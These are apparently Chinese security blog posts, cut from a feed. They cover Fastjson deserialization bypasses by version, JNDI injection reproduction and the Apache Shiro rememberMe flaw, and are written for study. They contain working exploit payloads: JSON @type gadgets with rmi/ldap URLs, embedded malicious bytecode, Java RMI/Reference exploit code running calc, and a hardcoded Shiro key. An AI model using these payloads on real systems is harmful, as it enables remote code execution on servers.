</p><p>我们使用先使用javac将test编译成.class文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Main.java</span><br></pre></td></tr></table></figure><p>然后使用工具BCELCodeman对这个字节码进行BCEL编码。基本可以理解为是传统字节码的HEX编码，再将反斜线替换成<code>$</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BCELCodeman/src/BCELCodeman.jar e test.class</span><br></pre></td></tr></table></figure><p>最后发生payload发送到目标</p><p>​      </p><p>另外，若是目标使用的是JSON.parseObject()方法进行反序列化，那么POC更简单一些</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b......&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​      </p><h4 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h4><p>该链和BasicDataSource都用到了字节码，完整利用链TemplatesImpl.getOutputProperties()-&gt; TemplatesImpl.newTransformer()-&gt; TemplatesImpl.getTransletInstance()-&gt; TemplatesImpl.defineTransletClasses()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个PoC原理上也是利用了 ClassLoader  动态加载恶意代码，在Payload中直接传入字节码。TransletClassLoader.defineClass() 将 Bytecode  字节码转为Class对象。但是这种限制比较多，要求开发者在调用parseObject()时额外设置  Feature.SupportNonPublicField，在实战中很少见，这里就不写了。</p><p>​      </p><h3 id="各版本绕过"><a href="#各版本绕过" class="headerlink" title="各版本绕过"></a>各版本绕过</h3><p>1.2.24及以前版本比较简单，在1.2.25开始加入了黑白名单机制，安全性提高</p><p>1.2.25~1.2.41</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">黑名单：</span><br><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>1.2.25 中加入了CheckAutoType方法，里面有个autotypesupport属性，如果为false，那么就会检测json中@type的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类，autotypesupport开启时，会先白名单加载，后黑名单检测</p><p>loadClass 时会移除开头的L和结尾的 “ ; “，那我们自己添加进去，并且在autotypesupport开启时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:9000/exploit&quot;,&quot;autoCommit&quot;:true&#125;&quot;;</span><br></pre></td></tr></table></figure><p>​       </p><p>1.2.25~1.2.47</p><p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p><p>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​      </p><p>1.2.42(1)</p><p>会先将开头的 L 和结尾的 “ ; “ 移除再进行黑名单判断，那就双写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:9000/exploit&quot;,&quot;autoCommit&quot;:true&#125;&quot;;</span><br></pre></td></tr></table></figure><p>​      </p><p>1.2.42(2)</p><p>遇到 LL 开头的 typeName 直接抛出异常退出….</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span> : <span class="string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>[,&#123;</span><br><span class="line">  <span class="attr">&quot;_bytecodes&quot;</span> : [<span class="string">&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;_name&quot;</span> : <span class="string">&quot;a&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_tfactory&quot;</span> : &#123;&#125;,</span><br><span class="line">  <span class="attr">&quot;outputProperties&quot;</span> : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​      </p><p>1.2.25~1.2.45</p><p>绕过黑名单的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Fastjson是一个Java语言编写的高性能功能完善的开源JSON解析库，属于阿里巴巴。用于对JSON格式的数据进行解析和打包，能够支持将</summary>
      
    
    
    
    <category term="json" scheme="https://www.mtrleed.top/categories/json/"/>
    
    
  </entry>
  
  <entry>
    <title>JNDI注入</title>
    <link href="https://www.mtrleed.top/post/10/"/>
    <id>https://www.mtrleed.top/post/10/</id>
    <published>2022-05-26T16:00:00.000Z</published>
    <updated>2023-06-24T15:22:08.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在关于java的一些漏洞中或多或少都看到了JNDI注入的踪迹，比如在java的一些反序列化漏洞中较为常见。浅浅看下JNDI是什么以及都可能会有哪些问题产生。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在分析之前我们需要稍稍过一下这些玩意的概念<strong>RMI、JNDI、JRMP、LDAP</strong>。</p><blockquote><p>RMI：RMI（Remote Method Invocation）基于序列化的java远程方法调用机制，作为一个常见的反序列化入口，它和反序列化漏洞的关系很大。它能够直接传输序列化后的java对象和分布式垃圾收集。 他的实现依赖于JAVA虚拟机（JVM）。因此它仅支持从一个JVM到另一个JVM的调用。</p></blockquote><blockquote><p>JNDI：JNDI (Java Naming and Directory Interface)  是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。JDNI支持通过url直接下载远程class文件的方式去加载执行服务。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。 JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service  Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，根据名字动态加载数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">支持的服务主要有以下几种：</span><br><span class="line">DNS、LDAP、CORBA对象服务、RMI</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>JRMP：JRMP（JAVA Remote Messageing   Protocol）是一种协议，是RMI这行为过程中数据传输的规范。RMI涉及到两个端，一个是调用端，一个是被调用端，他们之间会有数据传输，JRMP协议就是对这种形式的数据传输进行规范定义的。就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。</p></blockquote><blockquote><p>LDAP：LDAP（Light Weight Directory Access Protocol）是一个轻量级存取的协议。优点就在能够快速响应用户的查找需求。</p></blockquote><p>至于JNDI在其中扮演什么的角色，我们简单画个图。用JNDI当做接口，可以轻松访问RMI，LDAP等服务。<br><img src="https://fastly.jsdelivr.net/gh/MTRleed/PicGo@master/2022/JNDI.png"></p><p>​      </p><h3 id="RMI和JNDI工作原理"><a href="#RMI和JNDI工作原理" class="headerlink" title="RMI和JNDI工作原理"></a>RMI和JNDI工作原理</h3><p>RMI是如何工作的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器创建好继承于Remote接口的类，并把它绑定到RMI服务器上</span><br><span class="line">客户端请求RMI服务器上的类</span><br><span class="line">服务端返回客户端所请求类的存根stub，客户端将这个stub看作实例化对象使用</span><br><span class="line">客户端调用stub的某个方法，并传入参数。该参数会发送到RMI服务器上，由RMI服务器按照客户端传来的参数来执行指定的方法</span><br><span class="line">服务器执行完后将结果返回给客户端</span><br></pre></td></tr></table></figure><p>所以从RMI这一端来看，客户端获取了远程对象后所执行的此对象的方法，都是由RMI服务器来执行的，之后RMI服务器会向客户端返回stub或者说一个对象，那如何才能使对象在客户端实例化，方法在这边实现呢？那就要用到JDK中的Reference类了。Reference类表示对存在于命名/目录系统以外的对象的引用，如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 .class 文件来进行实例化。</p><p>那如何创建一个Reference实例对象并绑定到RMI注册表呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数1为远程加载时所使用的类名， 参数2为要加载的类的完整类名，参数3为远程.class文件存放的地址</span></span><br><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;refClassName&quot;</span>, <span class="string">&quot;insClassName&quot;</span>, <span class="string">&quot;http://123.com:123/&quot;</span>); </span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);<span class="comment">//bind为绑定，将名称绑定到对象中</span></span><br></pre></td></tr></table></figure><p>​      </p><p>与RMI连用时JNDI如何工作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">接收RMI传过来的对象</span><br><span class="line">在本地查询无果后到远程加载</span><br><span class="line">实例化对象</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="JNDI动态协议转换"><a href="#JNDI动态协议转换" class="headerlink" title="JNDI动态协议转换"></a>JNDI动态协议转换</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化JNDI配置</span></span><br><span class="line">Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://localhost:1099&quot;</span>);<span class="comment">//PROVIDER_URL</span></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">ctx.lookup(<span class="string">&quot;rmi://123.com&quot;</span>);</span><br></pre></td></tr></table></figure><p>在基本配置中PROVIDER_URL规定了，当在本地找不到对应的类时该去哪里加载对应类的地址，但是，lookup()方法存在时，可以无视该规定，会加载lookup的地址。</p><p>​      </p><h3 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h3><p>假设client端地址为134.0.0.1，先来看下面一段，JNDI的client端的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Context context = <span class="keyword">new</span>  InitialContext();</span><br><span class="line">context.lookup(PROVIDER_URL);</span><br></pre></td></tr></table></figure><p>其中PROVIDER_URL为可控变量，此时，可以传入任意JNDI服务路径来实现注入，如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?PROVIDER_URL=rmi:<span class="comment">//34.0.0.2:8080evil</span></span><br></pre></td></tr></table></figure><p>当然，简单的加载远程类是能够在目标机器实例化对象的，因为目标机器并没有我们恶意类的.class文件，会用到前面提到的Reference。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/JNDI0.png"></p><p>受害机器得到指定类后，实例化对象，执行指定类的构造函数，触发恶意代码。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//恶意对象</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">aObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">aObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端RMI配置，绑定恶意的Reference到rmi注册表</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        String url = <span class="string">&quot;http://127.0.0.1:6666/&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;Create RMI registry on port 1099&quot;</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;aObj&quot;</span>, <span class="string">&quot;aObj&quot;</span>, url);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;a&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        context.lookup(<span class="string">&quot;rmi://localhost:1099/a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成.class文件，最后运行”目标”代码，弹出计算器。JDK版本为1.7，其他高版本会报错。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在关于java的一些漏洞中或多或少都看到了JNDI注入的踪迹，比如在java的一些反序列化漏洞中较为常见。浅浅看下JNDI是什么以及都可能会</summary>
      
    
    
    
    <category term="java" scheme="https://www.mtrleed.top/categories/java/"/>
    
    <category term="注入" scheme="https://www.mtrleed.top/categories/java/%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>shiro漏洞学习</title>
    <link href="https://www.mtrleed.top/post/5/"/>
    <id>https://www.mtrleed.top/post/5/</id>
    <published>2022-01-02T16:00:00.000Z</published>
    <updated>2023-03-10T02:38:24.707Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>shiro框架是Apache提供的一个安全框架（Java常用），该框架可以被很多的语言使用，广泛运用在各种应用系统中（大多为单体项目认证授权，微服务架构项目使用分布式部署可能不太适合）。shiro具有认证、授权、加密和会话管理等功能。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>shiro的四个主要功能简介<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%9B%9B%E4%B8%AA%E5%8A%9F%E8%83%BD.png"></p><ol><li><p>Anthentication认证，验证用户是否有相应的身份-登录认证;</p></li><li><p>Authorization授权，即权限验证;对已经通过认证的用户检查是否具有某个权限或者角色，从而控制是否能够进行某种操作;</p></li><li><p>SessionManagment会话管理，用户在认证成功之后创建会话，在没有退出之前，当前用户的所有信息都会保存在这个会话中;可以是普通的JavaSE应用，也可以是web应用;</p></li><li><p>Cryptography加密，对敏感信息进行加密处理,shiro就提供这种加密机制;</p></li></ol><p>支持的特性:</p><ul><li>oiebSupport-Shiro提供了过滤器，可以通过过滤器拦截web请求来处理web应用的访问控制</li><li>Caching缓存支持,shiro可以缓存用户信息以及用户的角色权限信息，可以提高执行效率</li><li>Concurrencyshiro支持多线程应用</li><li>Testing提供测试支持</li><li>RunAs允许一个用户以另一种身份去访问</li><li>RemeberMe（漏洞点之一）<br>说明:Shiro是一个安全框架，不提供用户、权限的维护（用户的权限管理需要我们自己去设计)</li></ul><h3 id="Shiro框架指纹识别"><a href="#Shiro框架指纹识别" class="headerlink" title="Shiro框架指纹识别"></a>Shiro框架指纹识别</h3><p>在请求包的Cookie中为rememberMe字段赋任意值，收到返回包的Set-Cookie中存在rememberMe=deleteMe字段，说明目标有可能使用Shiro框架，可以进一步测试。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E6%8C%87%E7%BA%B9.png">    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E6%8C%87%E7%BA%B91.png"></p><h3 id="CVE-2016-4437-ApacheShiro1-2-4反序列化漏洞"><a href="#CVE-2016-4437-ApacheShiro1-2-4反序列化漏洞" class="headerlink" title="(CVE-2016-4437)ApacheShiro1.2.4反序列化漏洞"></a>(CVE-2016-4437)ApacheShiro1.2.4反序列化漏洞</h3><p><strong>漏洞原理</strong></p><p>因为RemeberMe功能的存在下次访问时无需再登录就可访问，默认使用CookieRememberMeManager，登录时勾选rememberme序列化保存登录信息到cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie过程:</span><br><span class="line">序列化=&gt;AES加密=&gt;base64编码=&gt;写入Cookie</span><br><span class="line">随后在服务器端会相反的进行base64解码=&gt;AES解密=&gt;反序列化</span><br><span class="line">AES加密为对称加密，加密解密需要同一个密钥，重点就是AES密钥的获取</span><br><span class="line">其中1.2.4默认密钥kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>在这个过程中，我们发现AES密钥非常关键，但密钥被硬编码到了代码中，也就是说加密密钥Key编码在源码内。只要可以拿到源代码就可以拿到这个Key，只要得到默认的key，就可以被利用构造任意cookie，从而进行shiro的反序列化攻击。但是在Shiro1.2.5以上，官方已经修复了这个漏洞，已经拿不到KEY了。因此，在得到key的情况下攻击者可以构造一个恶意对象，并且进行序列化=&gt;AES加密=&gt;base64编码后，作为cookie中rememberMe字段进行发送，Shiro将收到的rememberMe字段进行base64解码=&gt;AES解密=&gt;反序列化后，最终执行了一个恶意代码指令，在目标服务器上执行任意命令造成反序列化RCE漏洞。注意，前提是需要有合法用户，为什么需要RememberMecookie是因为Shiro会先获取用户信息，当存在有效的用户信息时才会进入下一阶段的流程。<br>通过上面的知识知道要利用这个漏洞必须构造出一个可以让服务器反序列化的恶意对象。</p><ul><li>影响版本ApacheShiro&lt;=1.2.4</li><li> 